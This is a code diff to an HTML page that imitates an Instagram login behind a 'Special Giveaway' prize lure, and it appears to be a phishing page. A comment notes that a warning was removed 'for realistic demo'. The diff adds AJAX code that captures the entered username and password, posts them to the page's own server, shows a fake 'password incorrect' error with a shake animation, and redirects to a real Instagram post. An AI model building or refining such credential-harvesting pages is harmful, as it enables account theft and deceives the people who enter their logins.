@@ -210,6 +210,16 @@
             100% { transform: rotate(360deg); }
         }
 
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
+            20%, 40%, 60%, 80% { transform: translateX(5px); }
+        }
+
+        .shake {
+            animation: shake 0.5s;
+        }
+
         .loading-text {
             margin-top: 20px;
             color: #262626;
@@ -232,6 +242,9 @@
                 <h3>🎁 Special Giveaway!</h3>
                 <p>Login to claim your exclusive prize</p>
             </div>
+            
+            <!-- Error message -->
+            <div id="errorMessage" style="display: none; background: #fef5f5; border: 1px solid #f5c6cb; color: #721c24; padding: 10px; border-radius: 5px; margin-bottom: 15px; font-size: 13px; text-align: center;"></div>
             
             <form action="/login" method="POST" id="loginForm">
                 <input type="text" name="username" placeholder="Phone number, username, or email" required autocomplete="username">
@@ -256,21 +269,60 @@
     <!-- Warning removed for realistic demo -->
 
     <script>
-        // Show loading overlay and submit form
+        // Handle form submission with AJAX for error handling
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
-            const button = this.querySelector('.login-button');
+            const form = this;
+            const button = form.querySelector('.login-button');
+            const username = form.querySelector('[name="username"]').value;
+            const password = form.querySelector('[name="password"]').value;
+            const errorDiv = document.getElementById('errorMessage');
+            
+            // Clear previous errors
+            errorDiv.style.display = 'none';
+            
+            // Show loading state
             button.textContent = 'Logging in...';
             button.disabled = true;
-            
-            // Show loading overlay
             document.getElementById('loadingOverlay').classList.add('active');
             
-            // Submit the form after a realistic delay
-            setTimeout(() => {
-                this.submit();
-            }, 1500);
+            // Submit via AJAX
+            fetch('/login', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: new URLSearchParams({
+                    username: username,
+                    password: password
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.status === 'success') {
+                    // Redirect to Instagram post
+                    window.location.href = data.redirect;
+                } else {
+                    // Show error message
+                    document.getElementById('loadingOverlay').classList.remove('active');
+                    errorDiv.textContent = data.message || 'Sorry, your password was incorrect. Please double-check your password.';
+                    errorDiv.style.display = 'block';
+                    button.textContent = 'Log In';
+                    button.disabled = false;
+                    
+                    // Shake animation for error
+                    form.classList.add('shake');
+                    setTimeout(() => form.classList.remove('shake'), 500);
+                }
+            })
+            .catch(error => {
+                document.getElementById('loadingOverlay').classList.remove('active');
+                errorDiv.textContent = 'Sorry, your password was incorrect. Please double-check your password.';
+                errorDiv.style.display = 'block';
+                button.textContent = 'Log In';
+                button.disabled = false;
+            });
         });
     </script>
 </body>
